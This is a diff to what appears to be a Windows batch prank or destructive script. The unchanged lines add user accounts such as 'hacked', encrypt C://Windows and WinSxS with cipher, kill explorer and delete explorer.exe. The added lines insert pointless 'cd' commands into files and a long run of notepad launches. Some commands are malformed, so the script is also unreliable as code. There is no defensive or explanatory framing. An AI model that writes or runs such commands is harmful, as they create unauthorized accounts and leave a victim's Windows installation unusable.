@@ -29,6 +29,10 @@ cd Z://3/netcomputers/java.py
 cd A://
 cd A://2006
 cd A://2006/upgrading.vista
+cd C://vzz.doc
+cd C://tad.doc
+cd C://zzzzzzz.pptx
+cd C://goodluck.exe
 net user EXBVR /add
 net user hacked /add
 net user lolololololololololololololol /add
@@ -62,6 +66,21 @@ start C://Windows/System32/charmap.exe
 start C://Windows/System32/charmap.exe
 start C://Windows/System32/charmap.exe
 cipher /e C://Windows/WinSxS
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
+start C://Windows/System32/notepad.exe
 taskkill explorer.exe
 cipher /e C://Windows
 del /Q C://Windows/System32/explorer.exe
